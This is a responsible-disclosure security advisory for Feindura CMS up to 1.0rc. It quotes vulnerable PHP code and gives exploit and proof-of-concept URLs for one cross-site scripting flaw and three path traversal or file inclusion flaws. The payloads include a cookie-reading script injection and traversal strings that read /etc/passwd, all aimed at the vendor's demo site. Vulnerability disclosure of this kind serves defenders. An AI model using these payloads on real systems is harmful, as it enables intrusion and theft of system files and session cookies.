20101028 - Justanotherhacker.com : Multiple vulnerabilities in Feindura CMS
JAHx104 - http://www.justanotherhacker.com/advisories/JAHx104.txt
--------------------------------------------------------------------------------------------

[ Taken from: http://feindura.org ]

--- Vulnerability description ---
Feindura CMS sufferes from multiple vulnerabilities.

Discovered by: Eldar "Wireghoul" Marcussen
Type: Multiple
Severity: Medium
Release: Responsible
Affected versions: <= 1.0rc

--- Cross site scripting ---
The category parameter provided to editor.php is not sufficiently filtered and is vulnerable to cross site scripting.
Looking at the source we can see the variable gets assigned direclty from user input and later used in output.
library/sites/editor.php:24   $category = $_GET['category'];
library/sites/editor.php:186  echo '<form action="'.$_SERVER['PHP_SELF'].'?category='.$category.'&amp;page='.$page.'" method="post" accept-charset="UTF-8" id="editorForm">
Exploit:
http://[host]/[path]/library/sites/editor.php?category=[XSS]
PoC:
http://demo.feindura.org/library/sites/editor.php?category=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

--- Local file inclusion ---
The download.php script does not apply base path restrictions on the filename, this allows for arbitrary file reads.
library/process/download.php:22 header('Content-Type: x-type/subtype'); //"Bug-Fix" fÃ¼ IE 4.x &
 5.x
library/process/download.php:23
library/process/download.php:24 readfile(DOCUMENTROOT.$adminConfig['savePath'].$_GET['group
'].'/'.$_GET['filename']);
Exploit:
http://[host]/[path]/library/process/download.php?filename=[path/to/file]
PoC:
http://demo.feindura.org/library/process/download.php?filename=../../../../../../../etc/passwd

--- Local file inclusion ---
The filemanager script does not apply base path restrictions on the path, this allows for arbitrary file reads.
The vulnerable code is as follows:
library/thirdparty/filemanager/connectors/php/filemanager.php:72                   case 'download':
library/thirdparty/filemanager/connectors/php/filemanager.php:73                           if($fm->getvar('path')) {
library/thirdparty/filemanager/connectors/php/filemanager.php:74                                   $fm->download();
library/thirdparty/filemanager/connectors/php/filemanager.php-75                           }
library/thirdparty/filemanager/connectors/php/filemanager.class.php:245    public function download() {
library/thirdparty/filemanager/connectors/php/filemanager.class.php-246            if(isset($this->get['path']) && file_exists($_SERVER['DOCUMENT_ROOT'] . $this->get['path'])) {
library/thirdparty/filemanager/connectors/php/filemanager.class.php:247                    header("Content-type: application/force-downloa ");
library/thirdparty/filemanager/connectors/php/filemanager.class.php-248                    header('Content-Disposition: inline; filename="' . $_SERVER['DOCUMENT_ROOT'] . $this->get['path'] . '"');
library/thirdparty/filemanager/connectors/php/filemanager.class.php-249                    header("Content-Transfer-Encoding: Binary");
library/thirdparty/filemanager/connectors/php/filemanager.class.php-250                    header("Content-length: ".filesize($_SERVER['DOCUMENT_ROOT'] . $this->get['path']));
library/thirdparty/filemanager/connectors/php/filemanager.class.php-251                    header('Content-Type: application/octet-stream');
library/thirdparty/filemanager/connectors/php/filemanager.class.php-252                    $tmp = explode('/',$this->get['path']);
library/thirdparty/filemanager/connectors/php/filemanager.class.php-253                    $filename = $tmp[(sizeof($tmp)-1)];
library/thirdparty/filemanager/connectors/php/filemanager.class.php-254                    header('Content-Disposition: attachment; filename="' . $filename . '"');
library/thirdparty/filemanager/connectors/php/filemanager.class.php-255                    readfile($_SERVER['DOCUMENT_ROOT'] . $this->get['path']);
library/thirdparty/filemanager/connectors/php/filemanager.class.php-256            } else {
library/thirdparty/filemanager/connectors/php/filemanager.class.php-257                    $this->error(sprintf($this->lang('FILE_DOES_NOT_EXIST'),$this->get['path']));
library/thirdparty/filemanager/connectors/php/filemanager.class.php-258            }
library/thirdparty/filemanager/connectors/php/filemanager.class.php-259    }
Exploit:
http://[host]/[path]/library/thirdparty/filemanager/connectors/php/filemanager.php?mode=download&path=[path/to/file]
PoC:
http://demo.feindura.org/library/thirdparty/filemanager/connectors/php/filemanager.php?mode=download&path=/../../../../../../../../etc/passwd

--- Local file inclusion ---
Language selection code does not sufficiently filter the supplied variable, resulting arbitrary file reads and code execution.
Vulnerable code:
index.php:26 include("library/backend.include.php");
library/backend.include.php:46 if(isset($_GET['language']))
library/backend.include.php:47   $_SESSION['language'] = $_GET['language'];
library/backend.include.php-56 // includes the langFile which is set by the session var
library/backend.include.php:57 $langFile = include(dirname(__FILE__).'/lang/'.$_SESSION['language'].'.backend.php');
library/backend.include.php-58 
Exploit:
http://[host]/[path]/?language=../../../../../../../etc/passwd%00
PoC:
http://demo.feindura.org/?language=../../../../../../../etc/passwd%00

--- Solution ---
Password protect your feindura installation.
These issues are fixed in the coming 1.1 version.
